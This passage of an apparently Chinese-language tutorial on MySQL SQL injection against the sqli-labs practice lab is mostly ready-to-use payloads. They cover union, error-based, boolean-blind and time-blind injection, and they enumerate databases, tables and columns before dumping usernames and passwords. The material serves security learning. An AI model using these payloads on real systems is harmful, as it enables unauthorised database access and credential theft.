data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEyMTI0MTE4NDIwLnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250112124118420.png</span>&quot; alt=&quot;image-20250112124118420&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>
<p><strong>数据库名</strong></p>
<h4 id="关于将id值设置为0或者负数的解释"><a class="anchor" href="#关于将id值设置为0或者负数的解释">#</a> 关于将 id 值设置为 0 或者负数的解释</h4>
<p>由于我们的语句是插入到原有语句后面，这样就会出现两个 SQL 语句同时执行，由于 SQL 查询会默认返回一行数据，所以我们插入的第二行语句的结果就不会被返回，只会返回原有的 SQL 语句的查询内容。<br />
要让数据库查询我们插入的语句，需要让原有 SQL 语句产生查询错误，注意：查询错误不是语法错误，查询错误只会返回空，不会让语句报错。<br />
所以我们可以使 id=0 或 id=-1，零或负数不会被用作 id 值，它插入进去一定导致原有 SQL 语句查询结果为空，我们插入的 SQL 语句的结果就会被返回。<br />
联合查询时 union select 无法执行时 用 union+select 代替 接下来的查询语句空格全部用【+】代替</p>
<figure class="highlight ada"><figcaption data-lang="ada"></figcaption><table><tr><td data-num="1"></td><td><pre>?<span class="token variable">id</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token variable">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token variable">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>或所有数据库名</p>
<figure class="highlight applescript"><figcaption data-lang="applescript"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema.schemata <span class="token comment">--+</span></pre></td></tr></table></figure><p>指定数据库中表名（<strong>获取数据库表名</strong>）</p>
<figure class="highlight q"><figcaption data-lang="Q (kdb+ database)"></figcaption><table><tr><td data-num="1"></td><td><pre>id<span class="token verb operator">=</span><span class="token verb operator">-</span><span class="token number">1</span><span class="token adverb function">'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token verb operator">,</span><span class="token number">2</span><span class="token verb operator">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token verb operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token verb operator">-</span><span class="token verb operator">-</span><span class="token verb operator">+</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">1</span><span class="token adverb function">'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token verb operator">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token verb operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token verb operator">-</span><span class="token verb operator">-</span><span class="token verb operator">+</span></pre></td></tr></table></figure><p>或</p>
<figure class="highlight q"><figcaption data-lang="Q (kdb+ database)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token verb operator">?</span>id<span class="token verb operator">=</span><span class="token verb operator">-</span><span class="token number">1</span><span class="token adverb function">'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token verb operator">,</span><span class="token number">2</span><span class="token verb operator">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token verb operator">=</span><span class="token adverb function">'</span>security<span class="token adverb function">'</span> <span class="token verb operator">-</span><span class="token verb operator">-</span><span class="token verb operator">+</span></pre></td></tr><tr><td data-num="2"></td><td><pre>指定数据库中指定表中所有字段名</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token verb operator">?</span>id<span class="token verb operator">=</span><span class="token verb operator">-</span><span class="token number">1</span><span class="token adverb function">'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token verb operator">,</span><span class="token number">2</span><span class="token verb operator">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>columns <span class="token keyword">where</span> table_schema<span class="token verb operator">=</span><span class="token adverb function">'</span>security<span class="token adverb function">'</span> <span class="token keyword">and</span> table_name<span class="token verb operator">=</span><span class="token adverb function">'</span>users<span class="token adverb function">'</span> <span class="token verb operator">-</span><span class="token verb operator">-</span><span class="token verb operator">+</span></pre></td></tr></table></figure><p>具体数据</p>
<pre><code class="language-routeros">?id=-1' union select 1,2,group_concat(username,password) from users --+
</code></pre>
<h4 id="报错注入"><a class="anchor" href="#报错注入">#</a> 报错注入</h4>
<p>前提：页面会显示数据库报错信息。<br />
得到报错信息、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。<br />
数据库名</p>
<figure class="highlight applescript"><figcaption data-lang="applescript"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>0x7e<span class="token punctuation">,</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>0x7e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>或</p>
<figure class="highlight q"><figcaption data-lang="Q (kdb+ database)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token verb operator">?</span>id<span class="token verb operator">=</span><span class="token number">1</span><span class="token adverb function">'</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">count</span><span class="token punctuation">(</span><span class="token verb operator">*</span><span class="token punctuation">)</span><span class="token verb operator">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token verb operator">,</span><span class="token keyword">floor</span> <span class="token punctuation">(</span><span class="token keyword">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token verb operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token verb operator">-</span><span class="token verb operator">-</span><span class="token verb operator">+</span></pre></td></tr></table></figure><p>或所有数据库名</p>
<figure class="highlight applescript"><figcaption data-lang="applescript"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>0x7e<span class="token punctuation">,</span><span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema.schemata<span class="token punctuation">)</span><span class="token punctuation">,</span>0x7e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>由于无法像联合查询一样一次性看到所有数据库名称，就需要使用 limit 参数逐个查询</p>
<figure class="highlight n1ql"><figcaption data-lang="N1QL"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token function">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">floor</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span> <span class="token keyword">as</span> a<span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>指定数据库中表名</p>
<figure class="highlight q"><figcaption data-lang="Q (kdb+ database)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token verb operator">?</span>id<span class="token verb operator">=</span><span class="token number">1</span><span class="token adverb function">'</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">count</span><span class="token punctuation">(</span><span class="token verb operator">*</span><span class="token punctuation">)</span><span class="token verb operator">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token verb operator">=</span><span class="token adverb function">'</span>security<span class="token adverb function">'</span> limit <span class="token number">0</span><span class="token verb operator">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token verb operator">,</span><span class="token keyword">floor</span> <span class="token punctuation">(</span><span class="token keyword">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token verb operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token verb operator">-</span><span class="token verb operator">-</span><span class="token verb operator">+</span></pre></td></tr><tr><td data-num="2"></td><td><pre>指定数据库中指定表中所有字段名</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token verb operator">?</span>id<span class="token verb operator">=</span><span class="token number">1</span><span class="token adverb function">'</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">count</span><span class="token punctuation">(</span><span class="token verb operator">*</span><span class="token punctuation">)</span><span class="token verb operator">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>column_name<span class="token verb operator">,</span><span class="token adverb function">'</span><span class="token punctuation">;</span><span class="token adverb function">'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>columns <span class="token keyword">where</span> table_name<span class="token verb operator">=</span><span class="token adverb function">'</span>users<span class="token adverb function">'</span> limit <span class="token number">0</span><span class="token verb operator">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token verb operator">,</span><span class="token keyword">floor</span><span class="token punctuation">(</span><span class="token keyword">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token verb operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> as x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>columns <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span> as a<span class="token punctuation">)</span> <span class="token verb operator">-</span><span class="token verb operator">-</span><span class="token verb operator">+</span></pre></td></tr></table></figure><p>具体数据</p>
<figure class="highlight n1ql"><figcaption data-lang="N1QL"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('</span>Dumb<span class="token string">','</span>Angelina'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></pre></td></tr></table></figure><p>或使用 limit 挨个遍历</p>
<figure class="highlight n1ql"><figcaption data-lang="N1QL"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token function">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">concat</span><span class="token punctuation">(</span><span class="token keyword">cast</span><span class="token punctuation">(</span><span class="token function">concat</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0</span>x3a<span class="token punctuation">,</span><span class="token keyword">password</span><span class="token punctuation">)</span> <span class="token keyword">as</span> char<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span>x7e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><h4 id="布尔盲注"><a class="anchor" href="#布尔盲注">#</a> 布尔盲注</h4>
<p>情况：没有显示位、没有报错信息，但是有 SQL 语句执行错误信息输出的场景，仅仅通过报错这一行为去判断 SQL 注入语句是否执行成功。<br />
数据库长度</p>
<figure class="highlight applescript"><figcaption data-lang="applescript"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">7</span> <span class="token comment">--+	</span></pre></td></tr><tr><td data-num="2"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">8</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>数据库名</p>
<pre><code class="language-pgsql">?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+或?id=1' and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
</code></pre>
<p>或所有数据库名</p>
<figure class="highlight applescript"><figcaption data-lang="applescript"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>0x7e<span class="token punctuation">,</span><span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema.schemata<span class="token punctuation">)</span><span class="token punctuation">,</span>0x7e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>由于无法像联合查询一样一次性看到所有数据库名称，就需要使用 limit 参数逐个查询</p>
<figure class="highlight n1ql"><figcaption data-lang="N1QL"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token function">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">floor</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span> <span class="token keyword">as</span> a<span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>指定数据库中表名</p>
<figure class="highlight q"><figcaption data-lang="Q (kdb+ database)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token verb operator">?</span>id<span class="token verb operator">=</span><span class="token number">1</span><span class="token adverb function">'</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">count</span><span class="token punctuation">(</span><span class="token verb operator">*</span><span class="token punctuation">)</span><span class="token verb operator">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token verb operator">=</span><span class="token adverb function">'</span>security<span class="token adverb function">'</span> limit <span class="token number">0</span><span class="token verb operator">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token verb operator">,</span><span class="token keyword">floor</span> <span class="token punctuation">(</span><span class="token keyword">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token verb operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token verb operator">-</span><span class="token verb operator">-</span><span class="token verb operator">+</span></pre></td></tr></table></figure><p>指定数据库中指定表中所有字段名</p>
<figure class="highlight n1ql"><figcaption data-lang="N1QL"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select 1 from (select count(*),concat((select concat(column_name,'</span><span class="token punctuation">;</span><span class="token string">') from information_schema.columns where table_name='</span>users' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>columns <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span> <span class="token keyword">as</span> a<span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>具体数据</p>
<figure class="highlight n1ql"><figcaption data-lang="N1QL"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('</span>Dumb<span class="token string">','</span>Angelina'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></pre></td></tr></table></figure><p>或使用 limit 挨个遍历<br />
？id=1' and (select 1 from (select count (*),concat ((select (select concat (cast (concat (username,0x3a,password) as char),0x7e)) from users limit 0,1),floor (rand (0)*2)) x from information_schema.tables group by x) a) --+</p>
<h4 id="时间盲注"><a class="anchor" href="#时间盲注">#</a> 时间盲注</h4>
<p>前提：页面上没有显示位，也没有输出 SQL 语句执行错误信息。 正确的 SQL 语句和错误的 SQL 语句返回页面都一样，但是加入 sleep (5) 条件之后，页面的返回速度明显慢了 5 秒。<br />
缺点：因为是通过 sleep () 函数影响的响应时间来判断语句是否执行，所以比布尔盲注更慢，真实环境下时间盲注一个注入点需要跑大概五六个小时。<br />
猜解数据库<br />
数据库个数</p>
<pre><code class="language-mipsasm">?id=1 and if((select count(schema_name) from information_schema.schemata)=9,sleep(5),1)
</code></pre>
<p>第一个数据库名有多少个字符</p>
<pre><code class="language-pgsql">?id=1 and if((select length(schema_name) from information_schema.schemata limit0,1)=18,sleep(5),1)
</code></pre>
<p>判断第一个库第一个字符</p>
<pre><code class="language-pgsql">?id=1 and if((select ascii(substr((select schema_name from information_schema.schemata limit0,1),1,1)))=105,sleep(5),1)
?id=1 and if((select ascii(substr((select schema_name from information_schema.schemata limit0,1),2,1)))=110,sleep(5),1)//判断第一个库第二个字符
</code></pre>
<p>当前数据库<br />
当前数据库长度</p>
<figure class="highlight applescript"><figcaption data-lang="applescript"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token operator">+</span><span class="token operator">and</span><span class="token operator">+</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr><tr><td data-num="2"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token operator">+</span><span class="token operator">and</span><span class="token operator">+</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>当前数据库名</p>
<figure class="highlight applescript"><figcaption data-lang="applescript"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></pre></td></tr></table></figure><p>猜解表名</p>
<figure class="highlight n1ql"><figcaption data-lang="N1QL"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>URL 编码后：</p>
<figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token variable">%27</span><span class="token variable">%20</span><span class="token operator">and</span><span class="token variable">%20</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>select<span class="token variable">%20</span>table_name<span class="token variable">%20</span>from<span class="token variable">%20</span>information_schema<span class="token operator">.</span>tables<span class="token variable">%20</span>where<span class="token variable">%20</span>t</pre></td></tr><tr><td data-num="2"></td><td><pre>able_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token variable">%20</span>limit<span class="token variable">%200</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">108</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token variable">%20</span><span class="token operator">--</span><span class="token operator">+</span></pre></td></tr></table></figure><p>猜解字段名</p>
<figure class="highlight csharp"><figcaption data-lang="C#"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">?</span>id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>columns <span class="token keyword">where</span> <span class="token class-name">table_name</span><span class="token operator">=</span>'表名' limit <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">+</span></pre></td></tr></table></figure><p>URL 编码后：</p>
<figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token variable">%27</span><span class="token variable">%20</span><span class="token operator">and</span><span class="token variable">%20</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>select<span class="token variable">%20</span>column_name<span class="token variable">%20</span>from<span class="token variable">%20</span>information_schema<span class="token operator">.</span>columns<span class="token variable">%20</span></pre></td></tr><tr><td data-num="2"></td><td><pre>where<span class="token variable">%20</span>table_name<span class="token operator">=</span><span class="token variable">%27</span>users<span class="token variable">%27</span><span class="token variable">%20</span>limit<span class="token variable">%201</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token variable">%20</span><span class="token operator">--</span><span class="token 